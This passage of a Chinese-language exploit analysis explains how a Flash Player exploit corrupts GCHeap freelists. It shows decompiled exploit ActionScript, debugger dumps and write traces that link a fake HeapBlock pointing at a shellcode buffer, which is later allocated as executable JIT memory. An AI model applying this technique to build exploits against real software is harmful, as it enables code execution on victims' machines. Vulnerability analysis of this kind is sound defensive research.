
``` 
- Call Return: int.hgfh342 Array

 Location: J34534534/instance/jhgjhj22222 block id: 0 line no: 64

 Method Name: hgfh342

 Return Object ID: 0x210 (528)

 Object Type: int

 Return Value:

  Object:

   high: 0x0 (0)

   low: 0xc122db8 (202517944)

   high: 0x0 (0)

   low: 0x16893000 (378089472) <- memory for fake freelists structure

  Object Type: Array

  Log Level: 0x3 (3)

  Name:

 Object Name:

 Object ID: 0x1d1 (465)
```

### 图51 调用`GetByteArrayAddress(hgfh342)`获取ByteArray对象的内存地址

这里注意一点，和正常情况相同，`AllocateByteArrays(jhgjhj22222)`方法分配的ByteArray对象所在内存的页面属性也为可读写，相应的两块堆空间将分别用于保存用到的`freelists`元素以及`shellcode`代码，为了方便，将这两个ByteArray对象命名为`shellcode_bytearray`和`freelists_bytearray`。

```
public function AllocateByteArrays():Boolean  

{

  ...

  var randomInt:int = Math.ceil(((Math.random() * 0xFFFFFF) + 1));
  // Create shellcode ByteArray  shellcode_bytearray = new ByteArray();
  shellcode_bytearray.endian = Endian.LITTLE_ENDIAN;
  shellcode_bytearray.writeUnsignedInt(_local_1);
  shellcode_bytearray.length = 0x20313;

  // Create freelists ByteArray  freelists_bytearray = new ByteArray();
  freelists_bytearray.endian = Endian.LITTLE_ENDIAN;
  freelists_bytearray.writeUnsignedInt(_local_1);
  freelists_bytearray.length = 0x1322;

  g4 = GetByteArrayAddress(freelists_bytearray, false, randomInt)[1]; // Freelists ByteArray  hg45 = GetByteArrayAddress(shellcode_bytearray, false, randomInt)[1]; // Shellcode ByteArray  _local_2 = hg45;
  _local_4 = new ___Int64(0, 0);
  _local_3 = _local_4;
  return (((((!((_local_2.high == _local_3.high))) || (!((_local_2.low == _local_3.low))))) && (((!((_local_2.high == _local_3.high))) ||
    (!((_local_2.low == _local_3.low)))))));}
```

### 图52 分配ByteArray对象并获取相应的内存地址

在`GCHeap`类中有一个声明为`freelists`的变量，它是`HeapBlock`类型的数组，此数组包含那些已经释放掉的或保留的内存块来供程序后面的分配调度。

```
class GCHeap  
{
  ...
  Region *freeRegion;
  Region *nextRegion;
  HeapBlock *blocks;
  size_t blocksLen;
  size_t numDecommitted;
  size_t numRegionBlocks;
  HeapBlock freelists[kNumFreeLists];
  size_t numAlloc;
```

### 图53 `GCHeap`类的定义

`exploit`会将`0x16893000`处伪造的`freelists`元素链接到该数组中。

```
Enter: A1/instance/read4(00000000`6fb7bbb4)  
Return: A1/instance/read4 6fb7bba4  
Enter: A1/instance/write4(00000000`6fb7bbb0, 16893000)  
Return: A1/instance/write4 null  
Enter: A1/instance/write4(00000000`6fb7bbb4, 16893000)  
Return: A1/instance/write4 null
```

### 图54 将伪造的`freelists`元素链接到`freelists`数组中

此操作将通过修改`HeapBlock`结构体中的前驱及后继指针来实现。

```
// Block struct used for free lists and memory traversalclass HeapBlock  {
 public:
  char *baseAddr; // base address of block's memory  size_t size; // size of this block  size_t sizePrevious; // size of previous block  HeapBlock *prev; // prev entry on free list <- Corruption target  HeapBlock *next; // next entry on free list <- Corruption target  bool committed; // is block fully committed?  bool dirty; // needs zero'ing, only valid if committed
```

### 图55 `HeapBlock`结构体的定义

`0x6fb7bba4`指向的内容为`freelists`中的元素，它是`HeapBlock`类型的结构体，可以通过`dump`内存来查看`exploit`是如何对其进行`corrupt`的。

```
0:000> dds 6fb7bba4 <- HeapBlock structure  
6fb7bba4 00000000  
6fb7bba8 00000000  
6fb7bbac 00000000  
6fb7bbb0 6fb7bba4 HeapBlock.prev <- Corrupted to 16893000  
6fb7bbb4 6fb7bba4 HeapBlock.next <- Corrupted to 16893000  
6fb7bbb8 00000101  
6fb7bbbc 00000000  
6fb7bbc0 00000000  
6fb7bbc4 00000000
```

### 图56 `freelists`数组原先在`0x6fb7bbb0`处的内容

另外，`shellcode`代码会被写入`0x16dc3000`处相应的ByteArray对象中，此地址同样可以通过`GetByteArrayAddress(hgfh342)`函数来获取。

```
-Call Return: int.hgfh342 Array

 Location: J34534534/instance/jhgjhj22222 block id: 0 line no: 76

 Method Name: hgfh342

 Return Object ID: 0x248 (584)

 Object Type: int

 Return Value:

  Object:

   high: 0x0 (0)

   low: 0xc122d40 (202517824)

   high: 0x0 (0)

   low: 0x16dc3000 (383528960) <- base address of shellocode ByteArray

  Object Type: Array

  Log Level: 0x3 (3)

  Name:

 Object Name:

 Object ID: 0x1d1 (465)
```

### 图57 获取保存`shellcode`的ByteArray对象地址

`exploit`将在`0x16893000`处写入该`shellcode`对应的内存地址值。

```
0:000> dds 16893000  
16893000 16dc3000 <- pointer to shellcode memory  
16893004 00000010  
16893008 00000000  
1689300c 00000000  
16893010 00000000  
16893014 00000001  
16893018 41414141  
1689301c 41414141  
16893020 41414141  
16893024 41414141
```

### 图58 `0x16893000`处放置的是伪造的`freelists`元素

```
0:000> dds 16dc3000 <- shellcode ByteArray buffer, JIT operation target  
16dc3000 00000000  
16dc3004 00000000  
16dc3008 16dd2fec  
16dc300c 00000001  
16dc3010 16dd2e6c  
16dc3014 00000000  
16dc3018 00000000  
16dc301c 00000000
```

### 图59 `0x16dc3000`处放置的是`shellcode`

接着前面提到的`0x6fb7bbb0`处的`HeapBlock.prev`和`0x6fb7bbb4`处的`HeapBlock.next`这两个值会被重写为`0x16893000`，即伪造的`freelists`元素所在地址，而该元素的基址又指向了`0x16dc3000`处的`shellcode`。

```
Enter: A1/instance/read4(00000000`6fb7bbb4)  
Return: A1/instance/read4 6fb7bba4  
Enter: A1/instance/write4(00000000`6fb7bbb0, 16893000)  
Return: A1/instance/write4 null  
Enter: A1/instance/write4(00000000`6fb7bbb4, 16893000)  
Return: A1/instance/write4 null
```

### 图60 重写`HeapBlock.prev`和`HeapBlock.next`的值

小结下，`0x16893000`地址处放置的是伪造的`HeapBlock`结构，而`0x16dc3000`地址处将会保存写入的`shellcode`代码。这两个堆块的页属性都为可读写，下面给出的是`shellcode`所在内存的页面信息。

```
0:007> !address 16dc3000  
Usage: <unknown>  
Base Address: 16cf9000  
End Address: 17176000  
Region Size: 00200000 ( 2.000 MB)  
State: 00001000 MEM_COMMIT  
Protect: 00000004 PAGE_READWRITE <- Protection mode is RW  
Type: 00020000 MEM_PRIVATE  
Allocation Base: 16cf9000  
Allocation Protect: 00000001 PAGE_NOACCESS  
Content source: 1 (target), length: 1000
```

### 图61 地址`0x16dc3000`处的页面属性

从下述调试过程可以看出`exploit`把`shellcode`地址赋值给了伪造的`HeapBlock`结构中的基址变量。

```
Breakpoint 1 hit  
eax=16dc3000 ebx=0d5f20d0 ecx=16893000 edx=0b551288 esi=150947c0 edi=0d552020  
eip=6d462537 esp=0b551244 ebp=0b551244 iopl=0 nv up ei pl zr na pe nc  
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200246  
...
6d462535 8901 mov dword ptr [ecx],eax <- ecx: freelists address, eax: shellcode address
```

### 图62 `freelists[0]`将会指向`shellcode`所在的内存

而这个伪造的`freelists`元素所指向的内存区域，即`shellcode`所在的内存，会在`GCHeap::AllocBlock`调用中被重新声明并作为`JIT`空间赋予可读可执行的权限。

```
0:026> g  
Breakpoint 1 hit  
eax=16dc3000 ebx=16893000 ecx=00000000 edx=00000000 esi=00000010 edi=00000001  
eip=6d591cc2 esp=0b550ed8 ebp=0b550efc iopl=0 nv up ei ng nz ac pe cy  
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200297  
Flash!MMgc::alignmentSlop+0x2 [inlined in Flash!MMgc::GCHeap::Partition::AllocBlock+0x72]:  
6d591cc2 8bd7 mov edx,edi  
...
0:026> u eip -6  
...
6d591cc0 8b03 mov eax,dword ptr [ebx] <- retrieving heap block from free list
0:026> r ebx  
ebx=16893000

6d591cc2 8bd7 mov edx,edi  
6d591cc4 c1e80c shr eax,0Ch  
6d591cc7 23c1 and eax,ecx  
6d591cc9 2bd0 sub edx,eax  
6d591ccb 23d1 and edx,ecx
```

### 图63 获取`freelists[0]`的基址

相关的代码如下。

```
GCHeap::HeapBlock* GCHeap::AllocBlock(size_t size, bool& zero, size_t alignment)  
{
  uint32_t startList = GetFreeListIndex(size);
  HeapBlock *freelist = &freelists[startList]; // retrieving heap block from free list
  HeapBlock *decommittedSuitableBlock = NULL;
  ...
```

### 图64 `GCHeap::AllocBlock`函数

经过`GetFreeListIndex`函数中的一些计算后，此分配函数会从`freelists`数组中选取相应的堆块，并最终返回包含`shellcode`代码的页面。

此外，下述的`doInitDelay`方法实际上是Flash Player中的事件回调函数，当伪造的`freelists`结构被用到时，就会触发其中的`JIT`代码。

```
public dynamic class Boot extends MovieClip  {
  ...
  public function doInitDelay(_arg_1:*):void
  {
    Lib.current.removeEventListener(Event.ADDED_TO_STAGE, doInitDelay);
    start();
  }

  public function start():void
  {
    ...
    if (_local_2.stage == null)
    {
      _local_2.addEventListener(Event.ADDED_TO_STAGE, doInitDelay);
      ...
    };
  }
```

### 图65 周期性调用的`doInitDelay`方法

当上述方法被调用时，原先使用的某块内存会被置成保留状态，对新分配的内存程序会调用`VirtualProtect`函数将其页面属性设为`RX`。在此情况下，伪造的`freelists`元素所指向的内存区域最终会被用到。
